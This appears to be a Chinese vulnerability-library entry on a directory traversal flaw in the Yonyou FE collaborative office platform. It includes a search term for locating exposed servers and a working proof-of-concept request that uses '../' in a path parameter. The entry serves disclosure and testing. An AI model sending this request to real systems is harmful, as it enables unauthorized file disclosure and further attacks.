# 用友 FE协作办公平台 templateOfTaohong_manager.jsp 目录遍历漏洞

## 漏洞描述

用友 FE协作办公平台 templateOfTaohong_manager.jsp文件存在目录遍历漏洞，通过漏洞攻击者可以获取目录文件等信息，导致进一步攻击

## 漏洞影响

<a-checkbox checked>用友 FE协作办公平台</a-checkbox></br>

## 网络测绘

<a-checkbox checked>"FE协作"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1646059676433-1560cc0a-f228-4969-862e-6c1bca531f9b.png)

验证POC

```javascript
/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../
```

![img](../../../.vuepress/public/img/1646059728922-422586b0-6e56-4752-832e-4f386629fd2e.png)